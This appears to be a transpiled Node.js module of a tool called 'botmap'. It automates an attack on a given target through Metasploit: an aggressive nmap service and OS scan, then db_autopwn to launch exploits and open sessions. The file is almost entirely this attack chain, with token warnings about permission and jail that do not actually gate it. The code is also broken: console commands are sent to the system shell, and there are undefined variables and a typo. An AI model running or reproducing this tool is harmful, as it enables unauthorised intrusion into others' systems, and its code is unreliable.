'use strict';

var _child_process = require('child_process');

var _safe = require('colors/safe');

var _safe2 = _interopRequireDefault(_safe);

var _prompt = require('prompt');

var _prompt2 = _interopRequireDefault(_prompt);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

var _exports = module.exports = {};

//set theme
_safe2.default.setTheme({
  silly: 'rainbow',
  input: 'grey',
  verbose: 'cyan',
  prompt: 'grey',
  info: 'green',
  data: 'grey',
  help: 'cyan',
  warn: 'yellow',
  debug: 'blue',
  error: 'red'
});

//make sure that the user know what he's doing
_exports.userAuth = function () {
  console.warn(_safe2.default.warn("Note,that you need the permission of the target's owner !"));
  console.warn(_safe2.default.warn('Are you sure you want to scan and attack: \n' + target));
  console.log(_safe2.default.prompt('Press y to continue'));
  _prompt2.default.start();
  _prompt2.default.get('input', function (err, result) {
    if (result.input != 'y') {
      process.exit(1);
    }
  });
};

//perform exploit
_exports.exploit = function (target) {
  console.log(_safe2.default.info('Starting ...'));
  console.warn(_safe2.default.warn('Once again... I hope you now what you are doing...'));
  //start postgresql
  (0, _child_process.exec)('service postgresql start', function (err, stdout, stderr) {
    if (err || stderr) {
      var error = err || stderr;
      console.error(_safe2.default.error('Could not start postgresql! \n' + error));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('started postgresql'));
    }
  });
  //start msf
  (0, _child_process.exec)('msfconsole', function (err, stdout, stderr) {
    if (err || stderr) {
      var error = err || stderr;
      console.error(_safe2.default.error('Could not initialize msfdb! \n' + error));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('started msf'));
    }
  });
  (0, _child_process.exec)('workspace botmap', function (err, stdout, stderr) {
    if (err || stderr) {
      var error = err || stderr;
      console.error(_safe2.default.error('Error\n' + error));
      console.error(_safe2.default.error('Running "botmap setup" may fix this...'));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('switched workspace'));
    }
  });
  console.log(_safe2.default.info('Starting scan...'));
  (0, _child_process.exec)('db_nmap -sS -sV -sU -n -O ' + target, function (err, stdout, stderr) {
    if (err || stderr) {
      var error = err || stderr;
      console.error(_safe2.default.error('Could not scan target \n' + error));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('scan finished'));
    }
  });
  (0, _child_process.exec)('db_hosts', function (err, stdout, stderr) {
    if (err || stderr) {
      var error = err || stderr;
      console.error(_safe2.default.error('Could not get host info... \n' + error));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('HOST:' + stdout));
    }
  });
  console.warn(warn('Note that the following action can bring you to jail ! \n Botmap can not stop the action once it started !'));
  (0, _child_process.exec)('db_autopwn -p -t -e', function (err, stdout, stderr) {
    if (err || stderr) {
      var error = err || stderr;
      console.error(_safe2.default.error('Can not pwn the target... \n' + error));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('Exploit started... \n You will have a session if any of the exploits worked...'));
    }
  });
};

_exports.setup = function () {
  console.log(_safe2.default.info('Botmap is setting up a db workspace...'));
  (0, _child_process.exec)('service postgresql start', function (err, stdout, stderr) {
    if (err || stderr) {
      var error = err || stderr;
      console.error(_safe2.default.error('Could not start postgresql \n' + error));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('started postgresql'));
    }
  });
  (0, _child_process.exec)('service metasploit start', function (err, stdout, stderr) {
    if (err || stderr) {
      var error = err || stderr;
      console.error(_safe2.default.error('Could not start msf \n' + error));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('started msf'));
    }
  });
  (0, _child_process.exec)('workspace -a botmap', function (err, stdout, stderr) {
    if (err || stderr) {
      var error = err || stderr;
      console.error(_safe2.default.error('Could not create workspace\n' + error));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('created workspace'));
    }
  });
  (0, _child_process.exec)('workspace botmap', function (err, stdout, stderr) {
    if (err || stderr) {
      var error = err || stderr;
      console.error(_safe2.default.error('Could not switch to workspace \n' + error));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('switched workspace'));
    }
  });
  (0, _child_process.exec)('exit', function (err, stdout, stderr) {
    if (err || stderr) {
      var error = err || stderr;
      console.error(_safe2.default.error('Could not exit msfdb \n' + error));
      process.exit(1);
    } else {
      console.log(_safe2.default.info('exited mdfdb'));
    }
  });
  consoel.log(_safe2.default.silly('Setup complete !'));
};
/*
exec('command', (err, stdout, stderr) => {
  if(err || stderr) {
    let error = err || stderr
    console.error(error('Error\n' + error))
    process.exit(1)
  } else {
    console.log(info('info'))}
})
*/